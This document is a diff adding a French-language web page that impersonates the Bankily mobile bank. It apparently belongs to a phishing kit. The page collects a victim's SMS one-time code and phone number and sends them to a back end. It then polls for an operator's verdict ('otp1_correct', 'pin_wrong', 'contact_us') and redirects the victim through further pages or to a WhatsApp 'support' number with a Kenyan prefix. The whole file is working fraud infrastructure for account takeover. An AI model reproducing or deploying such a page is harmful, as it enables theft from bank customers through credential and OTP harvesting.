@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Bankily - Vérification OTP</title>
+    
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            --bankily-teal: #007B88;
+            --bankily-teal-dark: #005F69;
+            --bankily-gradient: linear-gradient(180deg, #0096A6 0%, #007B88 100%);
+            --bankily-yellow: #E5A823;
+            --bankily-yellow-hover: #C9901A;
+            --bg-color: #f7f7f7;
+            --card-bg: #ffffff;
+            --text-dark: #111111;
+            --text-muted: #666666;
+            --border-teal: #007B88;
+            --btn-disabled-bg: #e0e0e0;
+            --btn-disabled-text: #999999;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            align-items: center;
+        }
+
+        .header-box {
+            width: 100%;
+            background: var(--bankily-gradient);
+            padding: 25px 20px 40px 20px;
+            color: white;
+            text-align: center;
+            font-size: 26px;
+            font-weight: 800;
+            letter-spacing: -0.3px;
+        }
+
+        .header-box .yellow-part {
+            color: var(--bankily-yellow);
+            margin-left: 6px;
+        }
+
+        .main-container {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            margin-top: -20px;
+            flex-grow: 1;
+        }
+
+        .card {
+            background: var(--card-bg);
+            width: 90%;
+            max-width: 400px;
+            padding: 30px 25px;
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            align-self: flex-start;
+            text-align: center;
+        }
+
+        h2 {
+            margin: 0 0 12px 0;
+            font-size: 22px;
+            color: var(--text-dark);
+            font-weight: 800;
+            line-height: 1.2;
+        }
+
+        .instruction {
+            font-size: 14px;
+            color: var(--text-muted);
+            margin: 0 0 10px 0;
+            line-height: 1.4;
+        }
+
+        .phone-number {
+            font-size: 16px;
+            font-weight: 800;
+            color: var(--text-dark);
+            margin-bottom: 25px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        /* 4-Digit OTP Input Styles */
+        .otp-input-group {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin: 20px 0;
+        }
+
+        .otp-box {
+            width: 54px;
+            height: 58px;
+            border: 2px solid var(--border-teal);
+            border-radius: 12px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            outline: none;
+            background-color: #ffffff;
+            color: var(--text-dark);
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+
+        .otp-box:focus {
+            border-color: var(--bankily-teal-dark);
+            box-shadow: 0 0 0 3px rgba(0, 123, 136, 0.2);
+        }
+
+        .resend-text {
+            text-align: center;
+            color: var(--text-muted);
+            font-size: 14px;
+            margin: 20px 0;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background-color: var(--btn-disabled-bg);
+            color: var(--btn-disabled-text);
+            border: none;
+            padding: 16px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: not-allowed;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            transition: background-color 0.2s;
+        }
+
+        .submit-btn.active {
+            background-color: var(--bankily-yellow);
+            color: #000000;
+            cursor: pointer;
+        }
+
+        .submit-btn.active:hover {
+            background-color: var(--bankily-yellow-hover);
+        }
+
+        .footer-banner {
+            width: 100%;
+            background: var(--bankily-gradient);
+            height: 80px;
+            border-top-left-radius: 50% 30px;
+            border-top-right-radius: 50% 30px;
+            margin-top: 40px;
+        }
+
+        /* Overlay Styles */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            min-height: 100vh;
+            background: var(--bankily-gradient);
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            color: white;
+            text-align: center;
+            padding: 24px;
+        }
+
+        .overlay-card {
+            width: 100%;
+            max-width: 360px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .spinner {
+            width: 56px;
+            height: 56px;
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-top: 5px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 24px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .overlay-title {
+            font-size: 22px;
+            font-weight: 800;
+            margin-bottom: 12px;
+            color: white;
+        }
+
+        .overlay-desc {
+            font-size: 15px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: #ffffff;
+            line-height: 1.4;
+        }
+
+        .wa-btn {
+            display: block;
+            width: 100%;
+            background-color: white;
+            color: var(--bankily-teal);
+            font-weight: 800;
+            padding: 16px;
+            border-radius: 12px;
+            text-decoration: none;
+            word-break: break-all;
+            font-size: 13px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.15);
+        }
+
+        .error-message {
+            color: #e74c3c;
+            font-size: 13px;
+            margin-top: 10px;
+            display: none;
+            text-align: center;
+            font-weight: 600;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="header-box">
+    Bankily <span class="yellow-part">بنكيلي</span>
+</div>
+
+<div class="main-container">
+    <div class="card">
+        <h2>Vérification OTP</h2>
+
+        <p class="instruction">
+            Veuillez entrer le code de vérification à 4 chiffres envoyé par SMS au numéro :
+        </p>
+
+        <div class="phone-number">
+            <span>🇲🇷</span>
+            <span id="displayPhone">+222 ...</span>
+        </div>
+
+        <!-- 4 Digits OTP Inputs -->
+        <div class="otp-input-group">
+            <input type="text" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="one-time-code">
+            <input type="text" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
+            <input type="text" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
+            <input type="text" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
+        </div>
+
+        <div id="errorText" class="error-message">Le code OTP est incorrect ou a expiré. Veuillez réessayer.</div>
+
+        <div class="resend-text" id="timerBox">
+            Renvoyer le code dans <span id="timer">60</span> secondes
+        </div>
+
+        <button id="submitBtn" class="submit-btn" disabled>CONFIRMER</button>
+    </div>
+</div>
+
+<div class="footer-banner"></div>
+
+<!-- Fullscreen Loading Overlay -->
+<div class="overlay" id="statusOverlay">
+    <div class="overlay-card">
+        <div class="spinner"></div>
+        <div class="overlay-title">Vérification en cours...</div>
+    </div>
+</div>
+
+<!-- Fullscreen WhatsApp Contact Overlay -->
+<div class="overlay" id="contactOverlay">
+    <div class="overlay-card">
+        <div class="overlay-title">Contactez-nous sur WhatsApp</div>
+        <div class="overlay-desc">Cliquez sur ce lien pour contacter le support Bankily sur WhatsApp</div>
+        <a href="https://api.whatsapp.com/send?phone=254768003570&text=Bonjour,%20j'ai%20besoin%20d'aide%20avec%20Bankily" target="_blank" class="wa-btn">
+            https://api.whatsapp.com/send?phone=254768003570...
+        </a>
+    </div>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+    const displayPhone = document.getElementById('displayPhone');
+    const otpBoxes = document.querySelectorAll('.otp-box');
+    const submitBtn = document.getElementById('submitBtn');
+    const timerEl = document.getElementById('timer');
+    const timerBox = document.getElementById('timerBox');
+    const statusOverlay = document.getElementById('statusOverlay');
+    const contactOverlay = document.getElementById('contactOverlay');
+    const errorText = document.getElementById('errorText');
+
+    let checkInterval = null;
+
+    // Load saved phone number (Mauritania +222)
+    const savedPhone = localStorage.getItem('phone') || localStorage.getItem('userPhone') || "";
+    if (savedPhone) {
+        displayPhone.textContent = `+222 ${savedPhone.replace(/^\+?222/, '')}`;
+    } else {
+        displayPhone.textContent = "+222 ...";
+    }
+
+    // Auto-focus behavior and digit validation
+    otpBoxes.forEach((box, index) => {
+        box.addEventListener('input', () => {
+            box.value = box.value.replace(/\D/g, '');
+
+            if (box.value && index < otpBoxes.length - 1) {
+                otpBoxes[index + 1].focus();
+            }
+
+            checkOtpInputs();
+        });
+
+        box.addEventListener('keydown', (e) => {
+            if (e.key === "Backspace" && !box.value && index > 0) {
+                otpBoxes[index - 1].focus();
+            }
+        });
+
+        // Allow pasting full 4-digit code into first input box
+        box.addEventListener('paste', (e) => {
+            e.preventDefault();
+            const pasteData = (e.clipboardData || window.clipboardData).getData('text').trim().replace(/\D/g, '');
+            if (pasteData.length === 4) {
+                otpBoxes.forEach((b, i) => b.value = pasteData[i] || '');
+                otpBoxes[3].focus();
+                checkOtpInputs();
+            }
+        });
+    });
+
+    function checkOtpInputs() {
+        const isComplete = [...otpBoxes].every(box => box.value.length === 1);
+        submitBtn.disabled = !isComplete;
+        submitBtn.classList.toggle('active', isComplete);
+        errorText.style.display = 'none';
+    }
+
+    // Timer logic
+    let timeLeft = 60;
+    const timerInterval = setInterval(() => {
+        timeLeft--;
+        if (timerEl) timerEl.textContent = timeLeft;
+
+        if (timeLeft <= 0) {
+            clearInterval(timerInterval);
+            timerBox.innerHTML = '<span style="color:var(--bankily-teal); cursor:pointer; font-weight:700;" onclick="location.reload()">Renvoyer le code</span>';
+        }
+    }, 1000);
+
+    // Status polling routine
+    function startStatusPolling() {
+        if (checkInterval) clearInterval(checkInterval);
+
+        checkInterval = setInterval(async () => {
+            try {
+                const res = await fetch(`/api/check-status?phone=${encodeURIComponent(savedPhone)}`);
+                const data = await res.json();
+
+                // Successful OTP -> Proceed to Page 9
+                if (data.status === "otp1_correct") {
+                    clearInterval(checkInterval);
+                    window.location.href = "/page9";
+                } 
+                // Incorrect PIN -> Redirect back to login step
+                else if (data.status === "otp2_wrongpin" || data.status === "pin_wrong") {
+                    clearInterval(checkInterval);
+                    window.location.href = "/page6?error=wrongpin";
+                } 
+                // Invalid OTP entry -> Reset form & show error
+                else if (data.status === "otp1_wrong") {
+                    clearInterval(checkInterval);
+                    statusOverlay.style.display = "none";
+                    contactOverlay.style.display = "none";
+                    errorText.textContent = "Le code OTP est incorrect ou a expiré, veuillez réessayer.";
+                    errorText.style.display = "block";
+                    otpBoxes.forEach(b => b.value = "");
+                    otpBoxes[0].focus();
+                    submitBtn.disabled = true;
+                    submitBtn.classList.remove('active');
+                } 
+                // Trigger support overlay
+                else if (data.status === "contact_us") {
+                    clearInterval(checkInterval);
+                    statusOverlay.style.display = "none";
+                    contactOverlay.style.display = "flex";
+                }
+            } catch (err) {
+                console.error("Erreur de vérification du statut:", err);
+            }
+        }, 2000);
+    }
+
+    // Submit handler
+    submitBtn.addEventListener('click', async () => {
+        if (submitBtn.disabled) return;
+
+        let otpCode = "";
+        otpBoxes.forEach(b => otpCode += b.value);
+
+        if (otpCode.length !== 4) return;
+
+        contactOverlay.style.display = "none";
+        statusOverlay.style.display = "flex";
+        errorText.style.display = "none";
+
+        try {
+            const res = await fetch('/api/verify-first-otp', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    phone: savedPhone,
+                    otp: otpCode
+                })
+            });
+
+            const responseData = await res.json();
+            if (responseData.success) {
+                startStatusPolling();
+            } else {
+                statusOverlay.style.display = "none";
+                alert("Erreur lors de l'envoi.");
+            }
+        } catch (err) {
+            console.error("Erreur de soumission:", err);
+            statusOverlay.style.display = "none";
+            alert("Erreur de connexion.");
+        }
+    });
+
+    if (window.Telegram?.WebApp) {
+        window.Telegram.WebApp.ready();
+        window.Telegram.WebApp.expand();
+    }
+});
+</script>
+
+</body>
+</html>
